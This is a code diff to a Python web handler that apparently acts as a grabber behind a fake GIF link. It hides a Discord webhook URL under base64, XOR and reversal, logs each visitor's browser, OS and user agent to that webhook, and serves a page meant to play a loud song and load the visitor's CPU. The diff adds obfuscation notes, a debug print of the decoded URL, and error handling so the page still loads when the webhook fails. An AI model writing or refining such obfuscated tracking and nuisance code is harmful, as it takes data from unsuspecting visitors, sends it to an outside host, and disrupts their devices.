@@ -2,26 +2,41 @@ from http.server import BaseHTTPRequestHandler
 import requests
 import httpagentparser
 import base64
+import sys
+
+# =============================================================================
+# MULTI-LAYER OBFUSCATION (3 layers + Base64)
+# Layer 1 (innermost): string reversed
+# Layer 2: XOR cipher with key
+#
+# 
+# The real webhook URL is NEVER visible in plain text.
+# Only the decode function can recover it at runtime.
+# =============================================================================
+
 def unhide_webhook():
-  
+    # Heavily obfuscated payload (reverse of the 3-layer process)
     encoded = "IjcxNjoBXzJFOUEvFxw6Fh4tIjoeABE4HxZMKgAzOTIcShoxQEU9NU0sKUcyKBcBRAU7GB0qGSE8JF9WHj0WIzc8PwpIQEZZUk5aQUVGTUdeUUBEXl5CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
     
-
+    # Layer 3: Base64 decode
     step1 = base64.b64decode(encoded).decode('utf-8')
     
-
+    # Layer 2: XOR decrypt (same key used during encoding)
     key = "tungtungvirus"
     step2 = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(step1))
     
-
+    # Layer 1: reverse back to original
     return step2[::-1]
 
-
+# This is the ONLY place the real URL exists (in memory at runtime)
 WEBHOOK_URL = unhide_webhook()
+
+# DEBUG: Print the decoded URL so you can verify it's correct
+print("✅ DEBUG: Webhook URL successfully unhidden:", WEBHOOK_URL, file=sys.stderr)
 
 FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"
 
-
+# Max annoying page + loud song + HEAVY CPU lag
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
@@ -86,16 +101,38 @@ Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
 OS: {parsed.get('os', {}).get('name', 'Unknown')}
 UA: `{user_agent}`
 **Tung Tung + loud song + CPU hell activated!**"""
-            requests.post(WEBHOOK_URL, json={"content": log})
+
+            # === FIXED & IMPROVED WEBHOOK SEND ===
+            print("📤 Attempting to send webhook...", file=sys.stderr)
+            response = requests.post(
+                WEBHOOK_URL,
+                json={"content": log},
+                timeout=10
+            )
+            response.raise_for_status()  # This will raise if Discord returns error (401, 429, etc.)
+            print(f"✅ Webhook sent successfully! Discord status: {response.status_code}", file=sys.stderr)
+
             html = ANNOY_HTML.encode('utf-8')
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.send_header('Content-Length', len(html))
             self.end_headers()
             self.wfile.write(html)
+
+        except requests.exceptions.RequestException as e:
+            # Specific error for webhook problems
+            error_msg = f"Webhook failed: {str(e)}"
+            print("❌ " + error_msg, file=sys.stderr)
+            self.send_response(200)  # Still serve the prank page even if webhook fails
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(ANNOY_HTML.encode('utf-8'))
         except Exception as e:
+            # Catch everything else
+            print(f"❌ Unexpected error: {str(e)}", file=sys.stderr)
             self.send_response(500)
             self.end_headers()
             self.wfile.write(f"Error: {str(e)}".encode())
+
     def do_HEAD(self):
         self.do_GET()
